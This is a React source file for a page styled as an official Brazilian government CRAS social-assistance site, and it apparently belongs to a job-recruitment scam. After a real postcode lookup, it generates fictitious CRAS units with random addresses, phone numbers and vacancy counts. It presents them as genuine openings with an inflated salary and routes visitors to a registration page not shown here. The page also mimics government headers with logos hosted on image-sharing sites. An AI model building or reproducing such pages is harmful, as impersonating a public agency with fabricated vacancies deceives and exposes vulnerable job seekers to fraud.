import React, { useState, useEffect } from 'react';
import { MapPin, Phone, Search, Users, Facebook, Instagram } from 'lucide-react';

interface CrasUnit {
  name: string;
  address: string;
  phone: string;
  vacancies: number;
}

interface StateInfo {
  vacancies: number;
  salary: string;
}

const LocalPage: React.FC = () => {
  const [cep, setCep] = useState('');
  const [loading, setLoading] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [detectedLocation, setDetectedLocation] = useState('');
  const [units, setUnits] = useState<CrasUnit[]>([]);

  const stateVacancies: Record<string, StateInfo> = {
    'AC': { vacancies: 45, salary: 'R$ 2.500,00' },
    'AL': { vacancies: 124, salary: 'R$ 2.300,00' },
    'AP': { vacancies: 38, salary: 'R$ 2.600,00' },
    'AM': { vacancies: 186, salary: 'R$ 2.800,00' },
    'BA': { vacancies: 682, salary: 'R$ 2.900,00' },
    'CE': { vacancies: 425, salary: 'R$ 2.600,00' },
    'DF': { vacancies: 156, salary: 'R$ 4.200,00' },
    'ES': { vacancies: 178, salary: 'R$ 3.000,00' },
    'GO': { vacancies: 298, salary: 'R$ 2.800,00' },
    'MA': { vacancies: 315, salary: 'R$ 2.500,00' },
    'MT': { vacancies: 142, salary: 'R$ 2.900,00' },
    'MS': { vacancies: 118, salary: 'R$ 2.800,00' },
    'MG': { vacancies: 896, salary: 'R$ 3.200,00' },
    'PA': { vacancies: 387, salary: 'R$ 2.700,00' },
    'PB': { vacancies: 168, salary: 'R$ 2.400,00' },
    'PR': { vacancies: 524, salary: 'R$ 3.100,00' },
    'PE': { vacancies: 445, salary: 'R$ 2.700,00' },
    'PI': { vacancies: 152, salary: 'R$ 2.350,00' },
    'RJ': { vacancies: 738, salary: 'R$ 3.600,00' },
    'RN': { vacancies: 158, salary: 'R$ 2.500,00' },
    'RS': { vacancies: 512, salary: 'R$ 3.400,00' },
    'RO': { vacancies: 78, salary: 'R$ 2.600,00' },
    'RR': { vacancies: 42, salary: 'R$ 2.700,00' },
    'SC': { vacancies: 287, salary: 'R$ 3.300,00' },
    'SP': { vacancies: 1248, salary: 'R$ 3.800,00' },
    'SE': { vacancies: 98, salary: 'R$ 2.250,00' },
    'TO': { vacancies: 78, salary: 'R$ 2.400,00' }
  };

  const handleCepChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 5) {
      value = value.slice(0, 5) + '-' + value.slice(5, 8);
    }
    setCep(value);
  };

  const searchByZip = async () => {
    const cleanCep = cep.replace(/\D/g, '');
    
    if (cleanCep.length !== 8) {
      alert('Por favor, digite um CEP válido com 8 dígitos.');
      return;
    }

    setLoading(true);
    setShowResults(false);

    try {
      // Simulate API call to get location info
      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const data = await response.json();

      if (data.erro) {
        alert('CEP não encontrado. Verifique o CEP digitado.');
        setLoading(false);
        return;
      }

      const locationText = `${data.bairro}, ${data.localidade} - ${data.uf}`;
      setDetectedLocation(locationText);

      // Generate mock CRAS units for the state
      const stateInfo = stateVacancies[data.uf] || { vacancies: 100, salary: 'R$ 2.500,00' };
      const mockUnits = generateMockUnits(data.localidade, data.uf, stateInfo.vacancies);
      
      setUnits(mockUnits);
      setShowResults(true);
      setLoading(false);

    } catch (error) {
      console.error('Erro ao buscar CEP:', error);
      alert('Erro ao buscar unidades CRAS. Tente novamente mais tarde.');
      setLoading(false);
    }
  };

  const generateMockUnits = (city: string, state: string, totalVacancies: number): CrasUnit[] => {
    const unitNames = [
      `CRAS Central ${city}`,
      `CRAS Norte ${city}`,
      `CRAS Sul ${city}`,
      `CRAS Leste ${city}`,
      `CRAS Oeste ${city}`,
      `CRAS Vila Nova ${city}`,
      `CRAS Centro ${city}`,
      `CRAS Jardim ${city}`
    ];

    const neighborhoods = [
      'Centro', 'Vila Nova', 'Jardim América', 'Bela Vista', 'São José',
      'Santa Maria', 'Boa Vista', 'Parque Industrial', 'Vila São Paulo'
    ];

    const numUnits = Math.min(8, Math.max(3, Math.floor(totalVacancies / 50)));
    const units: CrasUnit[] = [];
    let remainingVacancies = totalVacancies;

    for (let i = 0; i < numUnits; i++) {
      const unitVacancies = i === numUnits - 1 
        ? remainingVacancies 
        : Math.floor(Math.random() * 5) + 2;
      
      remainingVacancies -= unitVacancies;

      const neighborhood = neighborhoods[i % neighborhoods.length];
      const streetNumber = Math.floor(Math.random() * 999) + 100;
      
      units.push({
        name: unitNames[i],
        address: `Rua das Flores, ${streetNumber}, ${neighborhood} - ${city}/${state}`,
        phone: `(${Math.floor(Math.random() * 89) + 11}) ${Math.floor(Math.random() * 9000) + 1000}-${Math.floor(Math.random() * 9000) + 1000}`,
        vacancies: unitVacancies
      });
    }

    return units;
  };

  const selectCrasUnit = (unit: CrasUnit) => {
    // Save selected unit to localStorage
    localStorage.setItem('selectedCrasUnit', JSON.stringify(unit));
    
    // Navigate to registration page
    window.history.pushState({}, '', '/registration');
    window.location.reload();
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      {/* Government Header */}
      <header className="bg-[#222222] text-white py-2">
        <div className="container mx-auto flex justify-between items-center px-4">
          <a className="font-bold text-sm" href="#">
            <img 
              src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" 
              alt="Logotipo Governo" 
              className="h-6"
            />
          </a>
          <nav>
            <ul className="flex space-x-4 text-[10px]">
              <li>
                <a className="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
              </li>
              <li>
                <a className="hover:underline" href="#">PARTICIPE</a>
              </li>
              <li>
                <a className="hover:underline" href="#">SERVIÇOS</a>
              </li>
            </ul>
          </nav>
        </div>
      </header>

      {/* CRAS Header */}
      <div className="bg-[#044785] py-3">
        <div className="container mx-auto px-4 text-center">
          <img 
            src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" 
            alt="Logo CRAS" 
            className="h-8 mx-auto"
          />
        </div>
      </div>

      <main className="flex-grow container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          <div className="mb-8">
            <h1 className="text-2xl font-bold text-gray-900 mb-4">Seleção de Unidade CRAS</h1>
            <p className="text-gray-700 mb-2">Selecione a unidade CRAS mais próxima à sua localização</p>
            <div className="h-1 w-32 bg-[#1451B4]"></div>
          </div>

          {/* CEP Search Section */}
          <div className="bg-white rounded-lg p-6 mb-6 shadow-sm border">
            <div className="max-w-md mx-auto text-center">
              <MapPin className="text-2xl text-[#1451B4] mb-4 mx-auto" size={32} />
              <h2 className="text-lg font-bold text-gray-900 mb-4">Localização por CEP</h2>
              <p className="text-sm text-gray-700 mb-4">
                Digite seu CEP para encontrarmos as unidades CRAS do seu estado:
              </p>
              <div className="mb-4">
                <label htmlFor="cep" className="block text-sm font-medium text-gray-900 mb-2">CEP *</label>
                <input 
                  type="text" 
                  id="cep" 
                  name="cep" 
                  maxLength={9}
                  value={cep}
                  onChange={handleCepChange}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1451B4] focus:border-[#1451B4]" 
                  placeholder="00000-000"
                  required
                />
              </div>
              
              {detectedLocation && (
                <div className="mb-4 p-3 bg-gray-100 rounded-lg">
                  <p className="text-sm text-gray-700">
                    <span>{detectedLocation}</span>
                  </p>
                </div>
              )}
              
              <button 
                type="button" 
                onClick={searchByZip}
                disabled={loading}
                className="w-full bg-[#1451B4] text-white px-6 py-3 rounded-lg font-bold hover:bg-[#0c3d8a] transition-colors duration-200 disabled:opacity-50"
              >
                <Search className="inline mr-2" size={16} />
                Buscar Unidades CRAS
              </button>
            </div>
          </div>

          {/* Loading Message */}
          {loading && (
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <div className="flex items-center">
                <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600 mr-3"></div>
                <span className="text-blue-800 font-medium">Buscando unidades CRAS...</span>
              </div>
            </div>
          )}

          {/* Results Section */}
          {showResults && (
            <div>
              <h2 className="text-xl font-bold text-gray-900 mb-4">Unidades CRAS Disponíveis</h2>
              <div className="space-y-4">
                {units.map((unit, index) => (
                  <div key={index} className="bg-white border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow duration-200">
                    <div className="flex justify-between items-start mb-3">
                      <h3 className="font-semibold text-gray-900 text-lg">{unit.name}</h3>
                      <span className="bg-green-100 text-green-800 text-xs font-medium px-2.5 py-0.5 rounded-full">
                        {unit.vacancies} vaga{unit.vacancies !== 1 ? 's' : ''}
                      </span>
                    </div>
                    
                    <div className="space-y-2 mb-4">
                      <div className="text-sm text-gray-700 mb-2">
                        <MapPin className="inline mr-2 text-[#1451B4]" size={16} />
                        {unit.address}
                      </div>
                      
                      <div className="text-sm text-gray-700 mb-3">
                        <Phone className="inline mr-2 text-[#1451B4]" size={16} />
                        {unit.phone}
                      </div>
                      
                      <div className="bg-gray-50 p-3 rounded-lg mb-4">
                        <div className="text-center">
                          <p className="text-gray-600 mb-1 text-sm">Salário</p>
                          <p className="font-bold text-[#1451B4]">R$ 4.500 - R$ 5.500 + benefícios</p>
                        </div>
                      </div>
                      
                      <button 
                        onClick={() => selectCrasUnit(unit)}
                        className="w-full bg-[#1451B4] text-white px-4 py-2 rounded-lg font-medium hover:bg-[#0c3d8a] transition-colors duration-200 text-sm"
                      >
                        Selecionar Esta Unidade
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#044785] text-white py-8 md:py-12">
        <div className="container mx-auto px-4 md:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">O que é o CRAS</a></li>
                <li><a href="#" className="hover:text-gray-200">Missão e Valores</a></li>
                <li><a href="#" className="hover:text-gray-200">Onde Atuamos</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Serviços</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Proteção Social Básica</a></li>
                <li><a href="#" className="hover:text-gray-200">Atendimento às Famílias</a></li>
                <li><a href="#" className="hover:text-gray-200">Grupos de Convivência</a></li>
                <li><a href="#" className="hover:text-gray-200">Benefícios Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Assistência Social</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Cadastro Único</a></li>
                <li><a href="#" className="hover:text-gray-200">Bolsa Família</a></li>
                <li><a href="#" className="hover:text-gray-200">BPC</a></li>
                <li><a href="#" className="hover:text-gray-200">Auxílio Brasil</a></li>
                <li><a href="#" className="hover:text-gray-200">Programas Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Vagas</a></li>
                <li><a href="#" className="hover:text-gray-200">Portal do Servidor</a></li>
                <li><a href="#" className="hover:text-gray-200">Capacitações</a></li>
                <li><a href="#" className="hover:text-gray-200">Concursos</a></li>
              </ul>
            </div>
          </div>
          
          <hr className="border-blue-400 mb-6" />
          
          <div className="flex flex-col md:flex-row justify-between items-center text-xs text-white">
            <div className="mb-4 md:mb-0">
              <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
            </div>
            <div className="flex flex-wrap justify-center gap-2 md:gap-4">
              <a href="#" className="hover:text-gray-200">Mapa do Site</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Política de Privacidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Lei de Acesso à Informação</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Acessibilidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Ouvidoria</a>
            </div>
            <div className="flex space-x-4 mt-4 md:mt-0">
              <a href="#" className="text-white hover:text-gray-200">
                <Facebook size={16} />
              </a>
              <a href="#" className="text-white hover:text-gray-200">
                <Instagram size={16} />
              </a>
            </div>
          </div>
        </div>
      </footer>

      {/* Floating Accessibility Icon */}
      <a 
        href="#" 
        className="fixed bottom-4 right-4 bg-blue-600 p-3 rounded-full shadow-lg hover:bg-blue-700 transition-colors z-50"
      >
        <Users className="w-6 h-6 text-white" />
      </a>
    </div>
  );
};

export default LocalPage;